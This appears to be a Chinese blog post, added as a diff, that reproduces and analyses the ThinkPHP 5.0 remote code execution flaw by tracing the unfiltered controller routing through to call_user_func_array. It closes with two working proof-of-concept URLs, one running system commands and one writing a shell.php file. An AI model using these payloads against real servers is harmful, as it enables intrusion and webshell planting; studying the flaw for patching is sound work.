@@ -1,0 +1,58 @@
+<hr>
+<p>title: thinkphp5.0远程代码执行漏洞利用分析<br>date: 2019-08-30 09:29:44</p>
+<h2 id="tags-漏洞复现"><a href="#tags-漏洞复现" class="headerlink" title="tags: 漏洞复现"></a>tags: 漏洞复现</h2><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>版本：thinkphp5.0.20(实际环境&lt;5.0.23即可)<br>配置：apache2，php5-</p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>2018年thinkphp官方更新了补丁，说明“由于框架对控制器名没有进行足够的检测，会导致在没有开启强制路由的情况下可能getshell的漏洞”。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>简介上说明了是路由调度时可能触发漏洞，所以就定位到pathinfo()函数。pathinfo()函数是thinkphp的一个特点，就是用pathinfo模式去访问一个不存在的路径，会有一个环境变量去把输入的url输出到正确的位置。<br><strong>跟进路径，防止迷路</strong></p>
+<pre><code>App.php run()--&gt;App.php routecheck()--&gt;Request.php pathinfo()--&gt;Route.php parseUrlPath()--&gt;App.php exec()--&gt;App.php module()--&gt;Loader.php controller()--&gt;App.php module()--&gt;App.php invokeMethod()
+</code></pre><p>在index.php加载thinkphp框架引导文件后，会执行think\App::run()方法，“\”表示将App作为类名来调用，run()中引入了routecheck()函数</p>
+<pre><code>// 未设置调度信息则进行 URL 路由检测
+if (empty($dispatch)) {
+    $dispatch = self::routeCheck($request, $config);
+}
+</code></pre><p>所以跟进routecheck()函数，发现routecheck()中有path()</p>
+<pre><code>$path   = $request-&gt;path();
+$depr   = $config[&apos;pathinfo_depr&apos;];
+$result = false;
+</code></pre><p>继续跟进pathinfo()函数，会获取pathinfo的信息</p>
+<pre><code>$_SERVER[&apos;PATH_INFO&apos;] = $_GET[Config::get(&apos;var_pathinfo&apos;)];
+</code></pre><p>由于配置文件中“var_pathinfo”的默认值是“s”，所以该pathinfo()函数会获取get请求中“s”对应的值，对应的位置是</p>
+<pre><code>index/think\app/invokefunction
+</code></pre><p>之后，parseurl()方法调用parseUrlPath()，只是通过“/”做分割，并未做过滤</p>
+<pre><code>// 分隔符替换 确保路由定义使用统一的分隔符
+$url = str_replace(&apos;|&apos;, &apos;/&apos;, $url);
+$url = trim($url, &apos;/&apos;);
+$var = [];
+
+#trim()去除字符串首尾处的空白字符
+</code></pre><p>获取到当前的调度信息之后，会执行分发函数exec()</p>
+<pre><code>$data = self::exec($dispatch, $config);
+</code></pre><p>传入exec的调度信息参数$dispatch为</p>
+<pre><code>$dispatch = {array}[2]
+type = &quot;module&quot;
+moudle = {array}[3]
+0 = &quot;index&quot;
+1 = &quot;think\app&quot;
+2 = &quot;invokefunction&quot;
+</code></pre><p>跟进module方法,执行模块</p>
+<pre><code>case &apos;module&apos;: // 模块/控制器/操作
+    $data = self::module(
+        $dispatch[&apos;module&apos;],
+        $config,
+        isset($dispatch[&apos;convert&apos;]) ? $dispatch[&apos;convert&apos;] : null
+                );
+</code></pre><p>该模块获取控制器名为“think\app”，且该处并未做任何过滤.<br>跟进controller方法，该方法的主要作用是实例化控制器，调用getModuleAndClass解析出$module和$class的值分别为“index”和“think\app”，再调用invokeClass($class)对class进行实例化</p>
+<pre><code>list($module, $class) = self::getModuleAndClass($name, $layer, $appendSuffix);
+
+if (class_exists($class)) {
+    return App::invokeClass($class);
+}
+</code></pre><p>回到module()方法，获得实例化放射类“think\App”后，执行反射类的方法</p>
+<pre><code>return self::invokeMethod($call, $vars);
+</code></pre><p>跟进invokeMethod，可以看到该方法将运行call_user_func_array函数<br><img src="thinkphp5-0远程代码执行漏洞利用分析/1.png" alt=""></p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p><strong>命令执行</strong></p>
+<pre><code>http://192.168.77.128/tp5/public/index.php?s=index/think\App/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami
+</code></pre><p><strong>文件写入</strong></p>
+<pre><code>http://192.168.77.128/tp5/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][1]=&lt;?php phpinfo();?&gt;
+</code></pre><p>shell.php的路径是</p>
+<pre><code>/var/www/example.com/public_html/tp5/public/shell.php
+</code></pre>
